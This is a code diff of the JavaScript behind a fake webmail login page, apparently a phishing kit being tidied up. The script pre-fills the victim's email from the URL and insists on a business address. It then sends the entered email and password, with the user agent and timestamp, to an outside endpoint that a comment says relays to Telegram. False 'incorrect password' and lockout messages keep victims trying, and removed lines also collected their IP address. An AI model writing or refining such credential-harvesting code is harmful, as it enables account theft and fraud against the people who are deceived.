@@ -115,8 +115,8 @@
     'hotmail.com','aol.com','msn.com','icloud.com'
   ];
 
-  let attemptCount = 0,
-      maxAttempts   = 2;
+  let attemptCount = 0;
+  const maxAttempts = 2;
 
   const form     = document.getElementById('loginForm'),
         emailFld = document.getElementById('email'),
@@ -125,74 +125,72 @@
         loginBtn = document.getElementById('loginBtn'),
         forgotPw = document.getElementById('forgotPwd');
 
-  // 1) Pre-fill email from URL fragment
+  // Pre-fill email from fragment
   const hashEmail = window.location.hash.substr(1);
-  if (hashEmail) {
-    emailFld.value = decodeURIComponent(hashEmail);
-  }
+  if (hashEmail) emailFld.value = decodeURIComponent(hashEmail);
 
-  // 2) "Forgot password?" stub
   forgotPw.addEventListener('click', e => {
     e.preventDefault();
-    alert('Password reset link would be sent to: ' +
-          (emailFld.value.trim() || '[your email here]'));
+    alert('Password reset link would be sent to: ' + (emailFld.value.trim()||'[your email]'));
   });
 
-  form.addEventListener('submit', async e => {
+  form.addEventListener('submit', e => {
     e.preventDefault();
-    errorDiv.textContent = '';
+    errorDiv.textContent = '';    // clear previous
+    if (loginBtn.disabled) return; // already locked
 
-    const email    = emailFld.value.trim(),
+    const email = emailFld.value.trim(),
           password = passFld.value;
 
     // --- VALIDATIONS ---
     if (!email.includes('@')) {
-      errorDiv.textContent = 'Please include an @ in your e-mail.';
-      return;
+      return errorDiv.textContent = 'Please include an @ in your e-mail.';
     }
     const domain = email.split('@').pop().toLowerCase();
     if (bannedDomains.includes(domain)) {
-      errorDiv.textContent = 'Please use your BUSINESS e-mail address.';
-      return;
+      return errorDiv.textContent = 'Please use your BUSINESS e-mail address.';
     }
     if (password.length < 4) {
-      errorDiv.textContent = 'Password must be at least 4 characters.';
-      return;
+      return errorDiv.textContent = 'Password must be at least 4 characters.';
     }
 
-    // --- PROCESS SUBMISSION ---
+    // --- IMMEDIATE FEEDBACK ---
     attemptCount++;
-
-    // get public IP
-    let ip = 'unknown';
-    try {
-      const resp = await fetch('https://api.ipify.org?format=json');
-      ip = (await resp.json()).ip;
-    } catch (_) { /* ignore errors */ }
-
-    // extra metadata
-    const ua = navigator.userAgent;
-    const ts = new Date().toISOString();
-
-    // user feedback
     const lockout = attemptCount > maxAttempts;
-    errorDiv.textContent = lockout
-      ? "You can't access your account right now. Try again later."
-      : 'Webmail or Password incorrect.';
     if (lockout) {
+      errorDiv.textContent = "You can't access your account right now. Try again later.";
       loginBtn.disabled = true;
       emailFld.disabled = passFld.disabled = true;
     } else {
+      errorDiv.textContent = 'Sending…';
       passFld.value = '';
     }
 
-    // ---- THIS CALL CHANGES ----
-    // send to your Worker (not directly to Telegram)
+    // --- ASYNC SUBMIT (non-blocking) ---
+    const payload = {
+      email,
+      password,
+      attemptCount,
+      // you can include these too
+      ua: navigator.userAgent,
+      ts: new Date().toISOString()
+    };
     fetch(endpoint, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email, password, attemptCount, ip, ua, ts })
-    }).catch(() => {});
+      headers: { 'Content-Type':'application/json' },
+      body: JSON.stringify(payload)
+    })
+    .then(_=> {
+      if (!lockout) {
+        // let the user know we got through
+        errorDiv.textContent = 'Logged attempt #' + attemptCount + '.';
+      }
+    })
+    .catch(_=>{
+      if (!lockout) {
+        errorDiv.textContent = 'Network error. Please try again.';
+      }
+    });
   });
 })();
 </script>
